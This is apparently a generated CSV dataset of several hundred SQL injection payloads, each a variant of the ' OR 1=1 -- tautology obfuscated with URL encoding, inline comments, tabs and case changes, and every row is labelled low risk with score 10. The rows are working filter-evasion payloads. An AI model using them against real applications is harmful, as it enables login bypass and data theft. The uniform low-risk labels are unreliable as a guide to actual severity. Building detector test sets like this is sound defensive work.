Query,Risk Level,Expected Score
'+or+1=1+-- # IbLMRsLg,low,10
'	||	1=1	-- -- FpPkl -- comment,low,10
' OR 1=1 -- # SYBHHCXLAT /* test */ /* test */,low,10
'/**/or/**/1=1/**/--/**/#/**/LVoFGtiv,low,10
'	OR	1=1	--+/*+test+*/,low,10
'	or	1=1	--	--	comment,low,10
' || 1=1 -- -- XMacj,low,10
'+OR+1=1+# # bdJHlpobV,low,10
""" or 1=1 -- # MySQL comment",low,10
'%20OR%201=1%20--	--	COMMENT,low,10
"""	||	1=1	--",low,10
' or 1=1 # -- hTZNBxIRHx,low,10
"""	OR	1=1	-- # DKeufKr",low,10
"""	or	1=1	-- /* test */",low,10
' OR 1=1 -- # IiYLUL,low,10
""" || 1=1 -- # MySQL comment",low,10
'%20OR%201=1%20-- # SbpkV,low,10
'/**/||/**/1=1/**/--,low,10
' oR 1=1 -- # zjKvs,low,10
'%20OR%201=1%20--%20/*%20test%20*/%20#%20MZDbUQ,low,10
' OR 1=1 -- # phFzIbux -- comment # MySQL comment,low,10
'/**//**/or/**//**/1=1/**//**/--/**//*/**/TEST/**/*/,low,10
'/**/||/**/1=1/**/--/**//*/**/test/**/*/,low,10
' OR 1=1 -- -- BFijr # MySQL comment,low,10
' OR 1=1 -- # LHOOSXP,low,10
'	OR	1=1	--	#	aVuwasYR,low,10
' || 1=1 -- -- comment -- comment,low,10
'%20OR%201=1%20-- /* TEST */,low,10
' or 1=1 -- /* test */ -- lzoSWOr,low,10
'+Or+1=1+--+--+comMenT,low,10
'	Or	1=1	-- -- yVoGdP,low,10
""" OR 1=1 -- -- uTtdjUoq",low,10
'	OR	1=1	#	#	comment	/*	test	*/,low,10
"""	OR	1=1	--	--	dPqFN",low,10
' || 1=1 -- -- dhVwRyt,low,10
' or 1=1 -- -- JguCFec # DgklAd,low,10
"""/**/||/**/1=1/**/--/**/#/**/MySQL/**/comment",low,10
'+OR+1=1+#+#+JFJnV,low,10
'	or	1=1	#,low,10
""" || 1=1 -- # RGRDJQp",low,10
' OR 1=1 -- /* test */ /* test */ -- drhSVOIN,low,10
' Or 1=1 -- # MySQL comment,low,10
' OR 1=1 # # WqdUSFs # PlCWYuDBBQ,low,10
' OR 1=1 # # HrgCwVhd,low,10
'%20or%201=1%20--%20--%20comment,low,10
' OR 1=1 # # WyusmloA,low,10
' OR 1=1 -- -- comment /* test */,low,10
'%20OR%201=1%20--%20--%20SCAEEHYER,low,10
' Or 1=1 -- /* test */ # MySQL comment /* test */,low,10
'	OR	1=1	--+#+MySQL+comment+--+xhpRtj,low,10
""" or 1=1 --",low,10
'/**/or/**/1=1/**/--/**/#/**/pRmQuFO,low,10
'+OR+1=1+--+/*+test+*/,low,10
'/**/OR/**/1=1/**/-- # UDCfmicNu,low,10
'+or+1=1+-- # zytieaxyh,low,10
'+OR+1=1+-- /* test */,low,10
' OR 1=1 -- -- NEAhYgeNjY,low,10
'%20OR%201=1%20--%20/*%20test%20*/,low,10
' or 1=1 -- # mysql comment,low,10
' OR 1=1 -- -- comment -- EKKqLKk,low,10
'/**/OR/**/1=1/**/--/**/--/**/comment/**/#/**/MySQL/**/comment # VhjVqBz,low,10
' OR 1=1 # # MySQL comment -- SvKHXUJ,low,10
'/**/OR/**/1=1/**/--/**/#/**/MySQL/**/comment,low,10
'/**/or/**/1=1/**/#/**/#/**/kaYjOO,low,10
' OR 1=1 -- # MYSQL COMMENT,low,10
' OR 1=1 -- /* test */ # ClGauzGb,low,10
' OR 1=1 # # MySQL comment,low,10
'	OR	1=1	-- -- prNqqg,low,10
'/**/oR/**/1=1/**/-- /* TeSt */ -- pMsQDR,low,10
' or 1=1 -- -- comment -- comment # CLZeolEj,low,10
'%20OR%201=1%20--%20--%20comment,low,10
' OR 1=1 # # EKDDTYOBEP,low,10
"""%20OR%201=1%20--",low,10
"""/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/ # XBQPEWP",low,10
' or 1=1 -- -- hfartk,low,10
' OR 1=1 # -- comment,low,10
""" or 1=1 # # COMMENT",low,10
'+or+1=1+--/**/#/**/mysql/**/comment,low,10
' OR 1=1 -- -- GFLQPGR # TQOGXB,low,10
"""+or+1=1+--",low,10
' || 1=1 -- -- comment # MySQL comment /* test */,low,10
'	OR	1=1	#	#	MySQL	comment,low,10
'%20OR%201=1%20--%20#%20rAozfxyFdC,low,10
'/**/OR/**/1=1/**/--	/*	test	*/,low,10
' OR 1=1 -- /* test */ -- GjWygnikyC,low,10
' or 1=1 -- -- comment,low,10
'	OR	1=1	--	/*	test	*/,low,10
' || 1=1 -- /* test */ # bkWYVsw,low,10
' Or 1=1 -- # Hskvpobti,low,10
""" or 1=1 -- -- comment # SNkXwC",low,10
'/**/or/**/1=1/**/--/**//*/**/test/**/*/,low,10
"""	oR	1=1	#",low,10
' or 1=1 -- # MysQl COmmenT,low,10
"""/**/or/**/1=1/**/--",low,10
'	||	1=1	--	--	comment # MySQL comment,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*/ # HMMSoZBux,low,10
'	or	1=1	-- # yqqbvzeaqo,low,10
'	OR	1=1	-- /* TEST */,low,10
'+OR+1=1+--+/*+test+*/ -- ZkfnZNBAyd /* test */,low,10
""" or 1=1 -- -- dankttv",low,10
'/**/or/**/1=1/**/-- -- comment,low,10
' or 1=1 # /* test */,low,10
'	or	1=1	--	#	mYsql	COMMENT,low,10
"""%20Or%201=1%20--",low,10
' OR 1=1 -- -- comment # byioE,low,10
'+or+1=1+-- /* test */,low,10
' OR 1=1 -- -- ComMEnt -- jENzQtjh,low,10
'+OR+1=1+-- # AnLWtIV,low,10
'	or	1=1	#	#	MySQL	comment,low,10
'%20or%201=1%20#%20/*%20test%20*/,low,10
""" OR 1=1 -- -- cvUzyGN",low,10
' OR 1=1 -- # iKAJpIy,low,10
'	||	1=1	-- -- comment,low,10
'  OR  1=1  --  #  nHzGqnOsT -- EddeSakW,low,10
'/**/OR/**/1=1/**/-- # URBMSMXGXZ /* TEST */,low,10
'+OR+1=1+--+--+IrdRAW -- comment,low,10
""" OR 1=1 -- # oeRjHgDH # LrNxqUaH",low,10
'/**/OR/**/1=1/**/--/**/--/**/comment,low,10
"""%20or%201=1%20--%20/*%20test%20*/",low,10
' oR 1=1 # # mYsql COMMENT,low,10
' OR 1=1 # # comment # MySQL comment,low,10
""" or 1=1 # # stPJSXGUKm",low,10
'/**/||/**/1=1/**/--/**/#/**/doYmdiLk/**//*/**/test/**/*/,low,10
'+OR+1=1+-- # MySQL comment /* test */,low,10
"""	OR	1=1	#	#	MySQL	comment",low,10
'	OR	1=1	#	#	PUCHEEQVJ,low,10
""" or 1=1 -- -- UVEBHKqP",low,10
'/**/OR/**/1=1/**/-- # XJrpaJkSIy,low,10
'	or	1=1	-- /* TEST */ /* test */,low,10
' || 1=1 # # GuPlHHODsU,low,10
' or 1=1 -- # nfkOh,low,10
"""	OR	1=1	--	#	mRDmPI	/*	test	*/",low,10
""" OR 1=1 -- # sbGaCyeHI",low,10
"""%20OR%201=1%20#",low,10
' OR 1=1 -- # NWQEJHCWS,low,10
'/**/Or/**/1=1/**/--/**//*/**/teST/**/*/,low,10
"""		OR		1=1		--",low,10
'/**/OR/**/1=1/**/--/**/#/**/gZkBzjb/**/--/**/EIEpQy/**/--/**/comment,low,10
""" OR 1=1 -- -- KOPADNAV",low,10
' OR 1=1 # /* test */ # MySQL comment -- comment,low,10
' OR 1=1 -- /* test */,low,10
' OR 1=1 -- /* test */ /* test */,low,10
'%20OR%201=1%20--%20/*%20test%20*/,low,10
' OR 1=1 -- /* test */ # jldcpZgGJy,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*/+#+MySQL+comment,low,10
' OR 1=1 -- /* test */ # MySQL comment -- RBYOIRTG -- AqHIUSg,low,10
' OR 1=1 -- /* TEST */,low,10
' OR 1=1 -- /* test */ # xRcUok,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/--/**/comment,low,10
'+OR+1=1+--+/*+test+*/,low,10
'+OR+1=1+--+/*+test+*/ /* test */,low,10
'+OR+1=1+--+/*+TEST+*/,low,10
' || 1=1 -- /* test */,low,10
' OR 1=1 # /* test */ # MkOMQMGXYZ,low,10
' or 1=1 -- /* test */,low,10
'  OR  1=1  --  /*  test  */,low,10
' OR 1=1 -- /* test */ -- comment,low,10
' OR 1=1 -- /* test */ -- bKHZd,low,10
' OR 1=1 # /* test */,low,10
' OR 1=1 -- /* test */ -- vyuniUvJGw,low,10
' or 1=1 -- /* TEST */ # bNBPoLRFOL -- comment,low,10
' OR 1=1 -- /* test */ # cJwqfdN,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/--/**/ldCUE,low,10
'%20OR%201=1%20--%20/*%20test%20*/ -- IRKkbKZhja,low,10
' or 1=1 -- /* TEST */,low,10
' OR 1=1 -- /* TEST */ -- comment,low,10
""" OR 1=1 -- /* test */ # pFJHq",low,10
'%20OR%201=1%20--%20/*%20test%20*/ # MySQL comment,low,10
' OR 1=1 -- /* test */ # kPNyHGr,low,10
' OR 1=1 -- /* test */ # Wmutr,low,10
' OR 1=1 -- /* test */ # mIjVyXFn,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*/,low,10
' Or 1=1 -- /* test */,low,10
' oR 1=1 -- /* TESt */ # dPGQhQ,low,10
'+or+1=1+--+/*+test+*/+--+comment,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/#/**/YDocmM,low,10
' OR 1=1 -- /* TEST */ /* TEST */,low,10
'	Or	1=1	--	/*	tEST	*/,low,10
' OR 1=1 -- /* test */ -- QNefx,low,10
' OR 1=1 -- /* test */ # DJMbRFBm,low,10
'+||+1=1+--+/*+test+*/,low,10
'	||	1=1	--	/*	test	*/,low,10
' || 1=1 -- /* test */ -- comment,low,10
' OR 1=1 -- /* test */ # TamCIbe,low,10
' OR 1=1 -- /* test */ -- THziu,low,10
' OR 1=1 -- /* test */ # MySQL comment,low,10
' or 1=1 -- /* TEST */ # mYsql COMMENT,low,10
'+or+1=1+--+/*+test+*/,low,10
'	OR	1=1	--	/*	test	*/,low,10
' OR 1=1 -- /* test */ -- NoROTj,low,10
""" OR 1=1 -- /* test */ /* test */",low,10
"""/**/or/**/1=1/**/--/**//*/**/test/**/*/",low,10
""" OR 1=1 -- /* test */ # MySQL comment",low,10
""" OR 1=1 -- /* TEST */",low,10
'%20Or%201=1%20--%20/*%20TeSt%20*/,low,10
' OR 1=1 -- /* test */ # ufRot,low,10
' oR 1=1 -- /* TEsT */,low,10
' OR 1=1 -- /* test */ -- wnAanJcvVJ,low,10
' OR 1=1 -- /* test */ -- comment -- comment,low,10
' OR 1=1 # /* test */ # BUMbygK,low,10
' OR 1=1 -- /* test */ # MpAqK /* test */,low,10
'+||+1=1+--+/*+test+*/ # MySQL comment,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*/ -- IyUDQ,low,10
'	OR	1=1	--	/*	test	*/ -- SwMNR,low,10
'/**/OR/**/1=1/**/#/**//*/**/test/**/*/,low,10
'%20or%201=1%20--%20/*%20test%20*/,low,10
' Or 1=1 -- /* tEst */,low,10
' OR 1=1 -- /* tEst */,low,10
' or 1=1 -- /* test */ # MySQL comment,low,10
'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
""" OR 1=1 -- /* test */",low,10
'%20oR%201=1%20--%20/*%20teST%20*/,low,10
'%20OR%201=1%20--%20/*%20test%20*/%20/*%20test%20*/ # MySQL comment,low,10
' || 1=1 -- /* test */ -- mkEVOqMcov,low,10
' OR 1=1 -- /* test */ -- LtZwsokjri,low,10
'	OR	1=1	--	/*	test	*/	#	MySQL	comment,low,10
' OR 1=1 -- /* test */ # sBLJCPG,low,10
' or 1=1 -- /* test */ # MySQL comment /* test */,low,10
' OR 1=1 -- /* test */ # AdAaJ /* test */,low,10
'+or+1=1+--+/*+teSt+*/,low,10
'	OR	1=1	--	/*	test	*/ -- hEYdLlzLS,low,10
' or 1=1 -- /* test */ /* test */,low,10
' or 1=1 -- /* TEST */ # CXDYvAFr # MySQL comment,low,10
' || 1=1 -- /* test */ /* test */,low,10
"""/**/oR/**/1=1/**/--/**//*/**/tesT/**/*/",low,10
' OR 1=1 # /* test */ # MySQL comment,low,10
' Or 1=1 -- /* TeST */ # MySQL comment,low,10
'  OR  1=1  --  /*  test  */ -- comment,low,10
'%20OR%201=1%20#%20/*%20test%20*/,low,10
' OR 1=1 -- /* test */ /* test */ /* test */,low,10
'	OR	1=1	--	/*	test	*/ # MySQL comment,low,10
'	OR	1=1	--	/*	test	*/	#	DhHWhD,low,10
'%20||%201=1%20--%20/*%20test%20*/,low,10
' OR 1=1 -- /* TEST */ -- uPgxh,low,10
'+OR+1=1+--+/*+test+*/ # MySQL comment,low,10
"""  OR  1=1  --  /*  test  */",low,10
'+OR+1=1+--+/*+test+*/ # FTCCcPJ,low,10
' OR 1=1 -- /* test */ /* test */ # nNlBV,low,10
' or 1=1 -- /* test */ -- QwoJvf,low,10
' or 1=1 -- /* TEST */ -- TDMRfHp,low,10
'%20OR%201=1%20--%20/*%20test%20*/%20--%20comment,low,10
'%20OR%201=1%20#%20/*%20test%20*/%20#%20comment,low,10
'	OR	1=1	#	/*	test	*/,low,10
' OR 1=1 -- /* test */ # MySQL comment /* test */,low,10
' OR 1=1 -- /* test */ # KdjRTeLBH,low,10
'+OR+1=1+#+/*+test+*/ # Iuwcsmi,low,10
'	OR	1=1	--	/*	test	*/	/*	test	*/,low,10
'%20OR%201=1%20--%20/*%20test%20*/%20#%20AsxaJRJT,low,10
' || 1=1 -- /* test */ # pruoK,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*/ -- comment,low,10
'	OR	1=1	--	/*	test	*/ -- comment,low,10
'	OR	1=1	--	/*	test	*/	/*	test	*/ -- uqIKMNGbe,low,10
' OR 1=1 -- /* TEST */ # XSHYI,low,10
' OR 1=1 -- /* test */ /* test */ # cHoVwUMaj,low,10
'	or	1=1	--	/*	test	*/,low,10
'+Or+1=1+--+/*+TeSt+*/+/*+TeST+*/,low,10
'%20or%201=1%20--%20/*%20TEST%20*//**/#/**/mYsql/**/COMMENT,low,10
'%20OR%201=1%20--%20/*%20TEST%20*/,low,10
'	or	1=1	--	/*	TEST	*/ # MySQL comment,low,10
'+OR+1=1+#+/*+test+*/+--+HmyKjp,low,10
'+OR+1=1+--+/*+test+*/+--+sVGKLs,low,10
"""+or+1=1+--+/*+TeST+*/",low,10
' OR 1=1 -- /* TEst */ /* TeST */,low,10
'/**/||/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
"""/**/OR/**/1=1/**/--/**//*/**/test/**/*/",low,10
'%20OR%201=1%20--%20/*%20test%20*/ -- lraePR,low,10
' || 1=1 -- /* TeSt */,low,10
'%20%20OR%20%201=1%20%20--%20%20/*%20%20test%20%20*/,low,10
' OR 1=1 -- /* teSt */ # MySqL COMment # mysqL ComMENT,low,10
' OR 1=1 -- /* test */ # eftmtflMxd,low,10
""" OR 1=1 -- /* test */ # leDnwSm",low,10
' oR 1=1 -- /* TeST */ /* test */,low,10
'+||+1=1+--+/*+TEST+*/,low,10
""" OR 1=1 -- /* test */ # mBJFZJUSK",low,10
' OR 1=1 -- /* test */ /* test */ # EBLdsVA,low,10
' or 1=1 -- /* test */ # cdSjm -- ZGBTAQNXV,low,10
""" OR 1=1 -- /* test */ -- comment",low,10
'	OR	1=1	--	/*	test	*/	#	VCuxu,low,10
' OR 1=1 -- /* test */ # MySQL comment # bWtap,low,10
' OR 1=1 -- /* TEST */ -- ioCZtd,low,10
'%20OR%201=1%20#%20/*%20test%20*/%20--%20sxjBrRL,low,10
'%20OR%201=1%20--%20/*%20test%20*/ -- comment,low,10
' OR 1=1 -- /* test */ # WGaCjw # MySQL comment -- apBugk,low,10
'%20OR%201=1%20--%20/*%20test%20*/%20--%20ktBCMLrTh,low,10
' OR 1=1 # /* TEST */,low,10
'+or+1=1+#+/*+test+*/,low,10
' OR 1=1 -- /* test */ -- XXeIjYvsum # YAlGIuYRZX -- comment,low,10
' OR 1=1 -- /* test */ # jxoeDzWD,low,10
""" or 1=1 -- /* TEST */",low,10
' OR 1=1 -- /* TEST */ -- COMMENT -- comment,low,10
'+OR+1=1+--+/*+test+*/+/*+test+*/,low,10
' || 1=1 -- /* tEst */ -- EYhynB # KSWjFxW,low,10
'+||+1=1+--+/*+TEST+*/ /* test */,low,10
' OR 1=1 -- /* TEST */ # MySQL comment,low,10
'+OR+1=1+--+/*+test+*/	--	UetDGuGJGo,low,10
'/**/or/**/1=1/**/--/**//*/**/test/**/*/ /* test */,low,10
'+or+1=1+--+/*+TEST+*/+--+comment # MySQL comment,low,10
' or 1=1 # /* TEST */ # MySQL comment,low,10
'+or+1=1+#+/*+TEST+*/+--+GyIIvgKc+--+comment,low,10
'+OR+1=1+--+/*+test+*/ # kxhvqjBLzm,low,10
' oR 1=1 -- /* test */ # dCpagIS,low,10
' OR 1=1 # /* TEST */ # NPZUSCCFCV /* test */,low,10
'%20or%201=1%20--%20/*%20test%20*/ -- comment,low,10
""" or 1=1 -- /* test */ # JGXsmo -- comment",low,10
'/**/OR/**/1=1/**/#/**//*/**/test/**/*//**/#/**/RkmvUHLFE/**//*/**/test/**/*/,low,10
""" || 1=1 -- /* test */",low,10
'%20or%201=1%20--%20/*%20TEST%20*/,low,10
' OR 1=1 -- /* TEST */ -- COMMENT,low,10
'/**/OR/**/1=1/**/--/**//*/**/test/**/*//**/#/**/qYENBDtaC,low,10
'	OR	1=1	--	/*	test	*/ /* test */,low,10
'+Or+1=1+--+/*+TESt+*/,low,10
'%20||%201=1%20--%20/*%20TEST%20*/%20--%20LJnqJp,low,10
'+OR+1=1+--+/*+test+*/ # kniqBw,low,10
"""%20OR%201=1%20--%20/*%20test%20*/ -- gfqobrRN",low,10
'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/ # MySQL comment -- EWGaAhiC,low,10
'+or+1=1+--+/*+test+*/ # ltbneclyhf,low,10
'/**/or/**/1=1/**/--/**//*/**/TEST/**/*/ # jxJyVZLEC,low,10
'	OR	1=1	--	/*	TEST	*/,low,10
""" or 1=1 -- /* test */",low,10
'	OR	1=1	--	/*	test	*/+#+siBzhH,low,10
'	OR	1=1	--	/*	test	*/	#	SYdPdq # hjofP,low,10
' or 1=1 -- /* TeSt */ -- DpObH,low,10
' OR 1=1 -- /* test */ # MySQL comment # MySQL comment,low,10
'+or+1=1+--+/*+Test+*/,low,10
' OR 1=1 # /* test */ # llNDV -- comment,low,10
' or 1=1 -- /* test */ # swhcrtj,low,10
' || 1=1 -- /* test */ -- hKIQahfu,low,10
'	or	1=1	--	/*	TEST	*/,low,10
'+OR+1=1+#+/*+test+*/ -- comment,low,10
' || 1=1 -- /* TEST */ -- comment,low,10
' OR 1=1 -- /* test */ -- oOdyyXT # STsgxA # MySQL comment # nEmIVZxSp,low,10
'%20or%201=1%20--%20/*%20test%20*/ # MySQL comment,low,10
' or 1=1 -- /* tESt */ /* TESt */,low,10
'/**//**/OR/**//**/1=1/**//**/--/**//**//*/**//**/test/**//**/*/+--+tKNmT,low,10
' OR 1=1 -- /* teST */ # aZfAm,low,10
'+OR+1=1+--+/*+test+*/+#+ZGAOxfSySH,low,10
'	OR	1=1	--	/*	test	*/	--	kPErmKVi,low,10
'	OR	1=1	--	/*	test	*/ -- OSXnXUKwIU,low,10
'+||+1=1+--+/*+TEST+*/+#+INSTPOEMIG,low,10
'%20or%201=1%20--%20/*%20test%20*/%20--%20comment,low,10
'%20OR%201=1%20--%20/*%20TEST%20*/%20--%20COMMENT%20#%20vsmajYst,low,10
'/**/Or/**/1=1/**/#/**//*/**/teST/**/*/,low,10
"""%20or%201=1%20--%20/*%20Test%20*/ /* TEsT */",low,10
' OR 1=1 -- /* test */ /* test */ -- mpCMlp,low,10
' || 1=1 -- /* TeST */,low,10
'+OR+1=1+--+/*+TEST+*/ # MySQL comment,low,10
' or 1=1 -- /* test */ -- alziydz,low,10
'	OR	1=1	--	/*	test	*//**//*/**/test/**/*/,low,10
'%20OR%201=1%20--%20/*%20test%20*/%20--%20comment%20#%20MySQL%20comment,low,10
""" or 1=1 -- /* test */ -- gzafrcbuy",low,10
'+OR+1=1+#+/*+test+*/ # MySQL comment # qmasMNDUf,low,10
'+OR+1=1+--+/*+test+*/+#+ZeYhiy # RPVJbrGQ,low,10
'/**/or/**/1=1/**/--/**//*/**/test/**/*/,low,10
' oR 1=1 -- /* tEsT */,low,10
' OR 1=1 -- /* TEST */ # VTXOFTKKL,low,10
'/**/OR/**/1=1/**/--/**//*/**/TEST/**/*//**/--/**/TONITOCYLL,low,10
'/**/||/**/1=1/**/--/**//*/**/test/**/*/ # MySQL comment -- hnZWrgTKt,low,10
"""%20OR%201=1%20--%20/*%20test%20*/ -- gjygNbyaA",low,10
' || 1=1 # /* test */,low,10
'%20oR%201=1%20#%20/*%20tesT%20*/,low,10
' OR 1=1 -- /* test */ /* test */ # mYsql COMMENT,low,10
'/**/||/**/1=1/**/--/**//*/**/TesT/**/*/,low,10
' || 1=1 -- /* TEST */,low,10
' OR 1=1 # /* test */ /* test */ -- comment,low,10
'/**/or/**/1=1/**/--/**//*/**/TEST/**/*//**/--/**/ZrRnnLyjS,low,10
'	OR	1=1	--	/*	test	*/	#	MySQL	comment	#	MySQL	comment,low,10
' OR 1=1 -- /* test */ # mMejIIFu # AWXmSU,low,10
'/**/or/**/1=1/**/--/**//*/**/TEST/**/*/,low,10
' || 1=1 -- /* test */ # MySQL comment -- ObXBmyc,low,10
'+or+1=1+#+/*+TEST+*/,low,10
' OR 1=1 -- /* TEST */ # XOCHWHK,low,10
'%20OR%201=1%20#%20/*%20test%20*/ # oCJXJdiE,low,10
' oR 1=1 -- /* tEST */,low,10
'/**/||/**/1=1/**/--/**//*/**/Test/**/*/,low,10
'+OR+1=1+--+/*+test+*/ -- TgssDK,low,10
""" or 1=1 # /* test */",low,10
'%20OR%201=1%20--%20/*%20test%20*/%20/*%20test%20*/,low,10
' OR 1=1 -- /* test */ # MySQL comment -- vTQTB,low,10
'  OR  1=1  --  /*  TeST  */  #  mYsql  coMMENT,low,10
'+OR+1=1+#+/*+test+*/ # groKEZZ,low,10
"""/**/OR/**/1=1/**/--/**//*/**/TEST/**/*/",low,10
'%20or%201=1%20#%20/*%20TEST%20*/,low,10
'%20Or%201=1%20--%20/*%20Test%20*/,low,10
'	OR	1=1	--	/*	test	*/	--	puMuOi,low,10
""" or 1=1 -- /* test */ # MySQL comment",low,10
' OR 1=1 -- /* TEST */ -- NRCAIC,low,10
'/**/Or/**/1=1/**/--/**//*/**/TEst/**/*/,low,10
' OR 1=1 -- /* test */ -- RJiKfl,low,10
'	||	1=1	--	/*	test	*/	--	comment,low,10
'%20||%201=1%20--%20/*%20test%20*/%20#%20MySQL%20comment,low,10
